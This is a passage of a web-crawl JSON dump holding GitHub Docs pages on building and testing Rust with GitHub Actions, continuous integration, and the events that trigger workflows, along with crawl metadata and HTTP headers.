- name: Run tests in \"${{ matrix.BUILD_TARGET }}\" mode run: cargo test --profile ${{ matrix.BUILD_TARGET }} \nThe release keyword used in this example corresponds to a cargo profile. You can use any profile you have defined in your Cargo.toml file.\nPublishing your package or library to crates.io\nOnce you have setup your workflow to build and test your code, you can use a secret to login to crates.io and publish your package.\nYAML\n- name: Login into crates.io run: cargo login ${{ secrets.CRATES_IO }} - name: Build binaries in \"release\" mode run: cargo build -r - name: \"Package for crates.io\" run: cargo package # publishes a package as a tarball - name: \"Publish to crates.io\" run: cargo publish # publishes your crate as a library that can be added as a dependency \nIf there are any errors building and packaging the crate, check the metadata in your manifest, Cargo.toml file, see The Manifest Format. You should also check your Cargo.lock file, see Cargo.toml vs Cargo.lock.\nPackaging workflow data as artifacts\nAfter a workflow completes, you can upload the resulting artifacts for analysis or to use in another workflow. You could add these example steps to the workflow to upload an application for use by another workflow.\nYAML\n- name: Upload release artifact uses: actions/upload-artifact@v4 with: name: <my-app> path: target/${{ matrix.BUILD_TARGET }}/<my-app> \nTo use the uploaded artifact in a different job, ensure your workflows have the right permissions for the repository, see Automatic token authentication. You could use these example steps to download the app created in the previous workflow and publish it on GitHub.\nYAML\n- uses: actions/checkout@v4 - name: Download release artifact uses: actions/download-artifact@v4 with: name: <my-app> path: ./<my-app> - name: Publish built binary to GitHub releases - run: | gh release create --generate-notes ./<my-app>/<my-project>#<my-app>",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-bgrf2.html",
  "markdown": "# Building and testing Rust - GitHub Docs\n\nYou can create a continuous integration (CI) workflow to build and test your Rust project.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to build, test, and publish a Rust package.\n\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Rust. For a full list of up-to-date software and the preinstalled versions of Rust, see [About GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners#preinstalled-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n\nWe recommend that you have a basic understanding of the Rust language. For more information, see [Getting started with Rust](https://www.rust-lang.org/learn).\n\n## [Using a Rust workflow template](#using-a-rust-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a Rust workflow template that should work for most basic Rust projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Rust\".\n    \n5.  Filter the selection of workflows by clicking **Continuous integration**.\n    \n6.  On the \"Rust - by GitHub Actions\" workflow, click **Configure**.\n    \n    ![Screenshot of the \"Choose a workflow\" page. The \"Configure\" button on the \"Rust\" workflow is highlighted with an orange outline.](https://docs.github.com/assets/cb-91615/images/help/actions/starter-workflow-rust.png)\n    \n7.  Edit the workflow as required. For example, change the version of Rust.\n    \n8.  Click **Commit changes**.\n    \n    The `rust.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n## [Specifying a Rust version](#specifying-a-rust-version)\n\nGitHub-hosted runners include a recent version of the Rust toolchain. You can use rustup to report on the version installed on a runner, override the version, and to install different toolchains. For more information, see [The rustup book](https://rust-lang.github.io/rustup/).\n\nThis example shows steps you could use to setup your runner environment to use the nightly build of rust and to report the version.\n\nYAML\n\n```\n      - name: Temporarily modify the rust toolchain version\n        run: rustup override set nightly\n      - name: Output rust version for educational purposes\n        run: rustup --version\n```\n\n### [Caching dependencies](#caching-dependencies)\n\nYou can cache and restore dependencies using the Cache action. This example assumes that your repository contains a `Cargo.lock` file.\n\nYAML\n\n```\n      - name: Cache\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            target\n          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}\n```\n\nIf you have custom requirements or need finer controls for caching, you should explore other configuration options for the [`cache` action](https://github.com/marketplace/actions/cache). For more information, see [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows).\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to use `cargo build` and `cargo test` in a job:\n\nYAML\n\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        BUILD_TARGET: [release] # refers to a cargo profile\n    outputs:\n      release_built: ${{ steps.set-output.outputs.release_built }}\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build binaries in \"${{ matrix.BUILD_TARGET }}\" mode\n        run: cargo build --profile ${{ matrix.BUILD_TARGET }}\n      - name: Run tests in \"${{ matrix.BUILD_TARGET }}\" mode\n        run: cargo test --profile ${{ matrix.BUILD_TARGET }}\n```\n\nThe `release` keyword used in this example corresponds to a cargo profile. You can use any [profile](https://doc.rust-lang.org/cargo/reference/profiles.html) you have defined in your `Cargo.toml` file.\n\n## [Publishing your package or library to crates.io](#publishing-your-package-or-library-to-cratesio)\n\nOnce you have setup your workflow to build and test your code, you can use a secret to login to [crates.io](https://crates.io/) and publish your package.\n\nYAML\n\n```\n      - name: Login into crates.io\n        run: cargo login ${{ secrets.CRATES_IO }}\n      - name: Build binaries in \"release\" mode\n        run: cargo build -r\n      - name: \"Package for crates.io\"\n        run: cargo package # publishes a package as a tarball\n      - name: \"Publish to crates.io\"\n        run: cargo publish # publishes your crate as a library that can be added as a dependency\n```\n\nIf there are any errors building and packaging the crate, check the metadata in your manifest, `Cargo.toml` file, see [The Manifest Format](https://doc.rust-lang.org/cargo/reference/manifest.html). You should also check your `Cargo.lock` file, see [Cargo.toml vs Cargo.lock](https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html).\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter a workflow completes, you can upload the resulting artifacts for analysis or to use in another workflow. You could add these example steps to the workflow to upload an application for use by another workflow.\n\nYAML\n\n```\n      - name: Upload release artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: <my-app>\n          path: target/${{ matrix.BUILD_TARGET }}/<my-app>\n```\n\nTo use the uploaded artifact in a different job, ensure your workflows have the right permissions for the repository, see [Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication). You could use these example steps to download the app created in the previous workflow and publish it on GitHub.\n\nYAML\n\n```\n      - uses: actions/checkout@v4\n      - name: Download release artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: <my-app>\n          path: ./<my-app>\n      - name: Publish built binary to GitHub releases\n      - run: |\n          gh release create --generate-notes ./<my-app>/<my-project>#<my-app>\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 253,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-rust-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 11990,
      "readableText": 11271,
      "none": 38630,
      "readableTextIfPossible": 11271,
      "result": 11271,
      "markdown": 7203
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions",
    "loadedTime": "2025-05-08T06:42:45.330Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions",
    "title": "About continuous integration with GitHub Actions - GitHub Docs",
    "description": "You can create custom continuous integration (CI) workflows directly in your GitHub repository with GitHub Actions.",
    "author": null,
    "keywords": "CI",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About continuous integration with GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "CD6D:19CE19:5304A3:6DC8D2:681BFE87",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "21458",
      "date": "Thu, 08 May 2025 06:42:33 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686553.337030, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "25249",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About continuous integration with GitHub Actions\nYou can create custom continuous integration (CI) workflows directly in your GitHub repository with GitHub Actions.\nAbout continuous integration\nContinuous integration (CI) is a software practice that requires frequently committing code to a shared repository. Committing code more often detects errors sooner and reduces the amount of code a developer needs to debug when finding the source of an error. Frequent code updates also make it easier to merge changes from different members of a software development team. This is great for developers, who can spend more time writing code and less time debugging errors or resolving merge conflicts.\nWhen you commit code to your repository, you can continuously build and test the code to make sure that the commit doesn't introduce errors. Your tests can include code linters (which check style formatting), security checks, code coverage, functional tests, and other custom checks.\nBuilding and testing your code requires a server. You can build and test updates locally before pushing code to a repository, or you can use a CI server that checks for new code commits in a repository.\nAbout continuous integration using GitHub Actions\nCI using GitHub Actions offers workflows that can build the code in your repository and run your tests. Workflows can run on GitHub-hosted virtual machines, or on machines that you host yourself. For more information, see Using GitHub-hosted runners and About self-hosted runners.\nYou can configure your CI workflow to run when a GitHub event occurs (for example, when new code is pushed to your repository), on a set schedule, or when an external event occurs using the repository dispatch webhook.\nGitHub runs your CI tests and provides the results of each test in the pull request, so you can see whether the change in your branch introduces an error. When all CI tests in a workflow pass, the changes you pushed are ready to be reviewed by a team member or merged. When a test fails, one of your changes may have caused the failure.\nWhen you set up CI in your repository, GitHub analyzes the code in your repository and recommends CI workflows based on the language and framework in your repository. For example, if you use Node.js, GitHub will suggest a workflow template that installs your Node.js packages and runs your tests. You can use the CI workflow template suggested by GitHub, customize the suggested workflow template, or create your own custom workflow file to run your CI tests.\nIn addition to helping you set up CI workflows for your project, you can use GitHub Actions to create workflows across the full software development life cycle. For example, you can use actions to deploy, package, or release your project. For more information, see Writing workflows.\nFor a definition of common terms, see Understanding GitHub Actions.\nWorkflow templates\nGitHub offers CI workflow templates for a variety of languages and frameworks.\nBrowse the complete list of CI workflow templates offered by GitHub in the actions/starter-workflows repository.\nFurther reading\nBuilding and testing\nManaging billing for GitHub Actions",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-m77c9h.html",
  "markdown": "# About continuous integration with GitHub Actions\n\nYou can create custom continuous integration (CI) workflows directly in your GitHub repository with GitHub Actions.\n\n## [About continuous integration](#about-continuous-integration)\n\nContinuous integration (CI) is a software practice that requires frequently committing code to a shared repository. Committing code more often detects errors sooner and reduces the amount of code a developer needs to debug when finding the source of an error. Frequent code updates also make it easier to merge changes from different members of a software development team. This is great for developers, who can spend more time writing code and less time debugging errors or resolving merge conflicts.\n\nWhen you commit code to your repository, you can continuously build and test the code to make sure that the commit doesn't introduce errors. Your tests can include code linters (which check style formatting), security checks, code coverage, functional tests, and other custom checks.\n\nBuilding and testing your code requires a server. You can build and test updates locally before pushing code to a repository, or you can use a CI server that checks for new code commits in a repository.\n\n## [About continuous integration using GitHub Actions](#about-continuous-integration-using-github-actions)\n\nCI using GitHub Actions offers workflows that can build the code in your repository and run your tests. Workflows can run on GitHub-hosted virtual machines, or on machines that you host yourself. For more information, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) and [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).\n\nYou can configure your CI workflow to run when a GitHub event occurs (for example, when new code is pushed to your repository), on a set schedule, or when an external event occurs using the repository dispatch webhook.\n\nGitHub runs your CI tests and provides the results of each test in the pull request, so you can see whether the change in your branch introduces an error. When all CI tests in a workflow pass, the changes you pushed are ready to be reviewed by a team member or merged. When a test fails, one of your changes may have caused the failure.\n\nWhen you set up CI in your repository, GitHub analyzes the code in your repository and recommends CI workflows based on the language and framework in your repository. For example, if you use [Node.js](https://nodejs.org/en/), GitHub will suggest a workflow template that installs your Node.js packages and runs your tests. You can use the CI workflow template suggested by GitHub, customize the suggested workflow template, or create your own custom workflow file to run your CI tests.\n\nIn addition to helping you set up CI workflows for your project, you can use GitHub Actions to create workflows across the full software development life cycle. For example, you can use actions to deploy, package, or release your project. For more information, see [Writing workflows](https://docs.github.com/en/actions/learn-github-actions).\n\nFor a definition of common terms, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n## [Workflow templates](#workflow-templates)\n\nGitHub offers CI workflow templates for a variety of languages and frameworks.\n\nBrowse the complete list of CI workflow templates offered by GitHub in the [actions/starter-workflows](https://github.com/actions/starter-workflows/tree/main/ci) repository.\n\n## [Further reading](#further-reading)\n\n*   [Building and testing](https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing)\n*   [Managing billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 241,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-about-continuous-integration-with-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 4892,
      "readableText": 4574,
      "none": 24316,
      "readableTextIfPossible": 4574,
      "result": 4574,
      "markdown": 3936
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows",
    "loadedTime": "2025-05-08T06:42:36.916Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows",
    "title": "Events that trigger workflows - GitHub Docs",
    "description": "You can configure your workflows to run when specific activity on GitHub happens, at a scheduled time, or when an event outside of GitHub occurs.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Events that trigger workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "87F5:17A58E:1A4FD6:240D1E:681BF7F0",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "23138",
      "date": "Thu, 08 May 2025 06:42:28 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686548.434883, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "48787",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Events that trigger workflows - GitHub Docs\nYou can configure your workflows to run when specific activity on GitHub happens, at a scheduled time, or when an event outside of GitHub occurs.\nAbout events that trigger workflows\nWorkflow triggers are events that cause a workflow to run. For more information about how to use workflow triggers, see Triggering a workflow.\nSome events have multiple activity types. For these events, you can specify which activity types will trigger a workflow run. For more information about what each activity type means, see Webhook events and payloads.\nNote\nNot all webhook events trigger workflows.\nbranch_protection_rule\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nbranch_protection_rule\t- created\n- edited\n- deleted\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when branch protection rules in the workflow repository are changed. For more information about branch protection rules, see About protected branches. For information about the branch protection rule APIs, see Objects in the GraphQL API documentation or REST API endpoints for branches and their settings.\nFor example, you can run a workflow when a branch protection rule has been created or deleted:\non: branch_protection_rule: types: [created, deleted] \ncheck_run\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ncheck_run\t- created\n- rerequested\n- completed\n- requested_action\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when activity related to a check run occurs. A check run is an individual test that is part of a check suite. For information, see Using the REST API to interact with checks. For information about the check run APIs, see Objects in the GraphQL API documentation or REST API endpoints for check runs.\nFor example, you can run a workflow when a check run has been rerequested or completed.\non: check_run: types: [rerequested, completed] \ncheck_suite\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ncheck_suite\t- completed\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. Although only the completed activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nTo prevent recursive workflows, this event does not trigger workflows if the check suite was created by GitHub Actions.\nRuns your workflow when check suite activity occurs. A check suite is a collection of the check runs created for a specific commit. Check suites summarize the status and conclusion of the check runs that are in the suite. For information, see Using the REST API to interact with checks. For information about the check suite APIs, see Objects in the GraphQL API documentation or REST API endpoints for check suites.\nFor example, you can run a workflow when a check suite has been completed.\non: check_suite: types: [completed] \ncreate\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ncreate\tNot applicable\tLast commit on the created branch or tag\tBranch or tag created\t\nNote\nAn event will not be created when you create more than three tags at once.\nRuns your workflow when someone creates a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to create a Git reference, see Mutations in the GraphQL API documentation or REST API endpoints for Git references.\nFor example, you can run a workflow when the create event occurs.\non: create \ndelete\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ndelete\tNot applicable\tLast commit on default branch\tDefault branch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nAn event will not be created when you delete more than three tags at once.\nRuns your workflow when someone deletes a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to delete a Git reference, see Mutations in the GraphQL API documentation or REST API endpoints for Git references.\nFor example, you can run a workflow when the delete event occurs.\non: delete \ndeployment\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ndeployment\tNot applicable\tCommit to be deployed\tBranch or tag to be deployed (empty if created with a commit SHA)\t\nRuns your workflow when someone creates a deployment in the workflow's repository. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment, see Mutations in the GraphQL API documentation or REST API endpoints for repositories.\nFor example, you can run a workflow when the deployment event occurs.\non: deployment \ndeployment_status\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ndeployment_status\tNot applicable\tCommit to be deployed\tBranch or tag to be deployed (empty if commit)\t\nNote\nWhen a deployment status's state is set to inactive, a workflow run will not be triggered.\nRuns your workflow when a third party provides a deployment status. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment status, see Mutations in the GraphQL API documentation or REST API endpoints for deployments.\nFor example, you can run a workflow when the deployment_status event occurs.\non: deployment_status \ndiscussion\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ndiscussion\t- created\n- edited\n- deleted\n- transferred\n- pinned\n- unpinned\n- labeled\n- unlabeled\n- locked\n- unlocked\n- category_changed\n- answered\n- unanswered\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nWebhook events for GitHub Discussions are currently in public preview and subject to change.\nRuns your workflow when a discussion in the workflow's repository is created or modified. For activity related to comments on a discussion, use the discussion_comment event. For more information about discussions, see About discussions. For information about the GraphQL API, see Objects.\nFor example, you can run a workflow when a discussion has been created, edited, or answered.\non: discussion: types: [created, edited, answered] \nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ndiscussion_comment\t- created\n- edited\n- deleted\n\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nWebhook events for GitHub Discussions are currently in public preview and subject to change.\nRuns your workflow when a comment on a discussion in the workflow's repository is created or modified. For activity related to a discussion as opposed to comments on the discussion, use the discussion event. For more information about discussions, see About discussions. For information about the GraphQL API, see Objects.\nFor example, you can run a workflow when a discussion comment has been created or deleted.\non: discussion_comment: types: [created, deleted] \nfork\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nfork\tNot applicable\tLast commit on default branch\tDefault branch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when someone forks a repository. For information about the REST API, see REST API endpoints for forks.\nFor example, you can run a workflow when the fork event occurs.\non: fork \ngollum\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\ngollum\tNot applicable\tLast commit on default branch\tDefault branch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when someone creates or updates a Wiki page. For more information, see About wikis.\nFor example, you can run a workflow when the gollum event occurs.\non: gollum \nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nissue_comment\t- created\n- edited\n- deleted\n\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when an issue or pull request comment is created, edited, or deleted. For information about the issue comment APIs, see Objects in the GraphQL API documentation or Webhook events and payloads in the REST API documentation.\nFor example, you can run a workflow when an issue or pull request comment has been created or deleted.\non: issue_comment: types: [created, deleted] \nThe issue_comment event occurs for comments on both issues and pull requests. You can use the github.event.issue.pull_request property in a conditional to take different action depending on whether the triggering object was an issue or pull request.\nFor example, this workflow will run the pr_commented job only if the issue_comment event originated from a pull request. It will run the issue_commented job only if the issue_comment event originated from an issue.\non: issue_comment jobs: pr_commented: # This job only runs for pull request comments name: PR comment if: ${{ github.event.issue.pull_request }} runs-on: ubuntu-latest steps: - run: | echo A comment on PR $NUMBER env: NUMBER: ${{ github.event.issue.number }} issue_commented: # This job only runs for issue comments name: Issue comment if: ${{ !github.event.issue.pull_request }} runs-on: ubuntu-latest steps: - run: | echo A comment on issue $NUMBER env: NUMBER: ${{ github.event.issue.number }} \nissues\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nissues\t- opened\n- edited\n- deleted\n- transferred\n- pinned\n- unpinned\n- closed\n- reopened\n- assigned\n- unassigned\n- labeled\n- unlabeled\n- locked\n- unlocked\n- milestoned\n- demilestoned\n- typed\n- untyped\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow 